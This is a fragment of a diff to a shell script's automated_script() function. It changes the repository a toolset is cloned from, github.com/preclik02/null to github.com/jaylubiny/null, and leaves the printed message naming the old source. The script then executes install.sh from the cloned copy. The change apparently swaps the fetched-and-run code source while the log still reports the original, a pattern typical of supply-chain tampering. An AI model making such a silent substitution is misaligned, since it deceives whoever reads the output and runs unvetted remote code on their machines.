@@ -55,7 +55,7 @@ automated_script() {
 
         # Clone your custom secure environment toolset
         printf 'Fetching toolset from github.com/preclik02/null...\n'
-        git clone https://github.com/preclik02/null.git /tmp/null-toolset
+        git clone https://github.com/jaylubiny/null.git /tmp/null-toolset
 
         # Execute the wrapper compilation/installation script
         if [[ -f /tmp/null-toolset/install.sh ]]; then
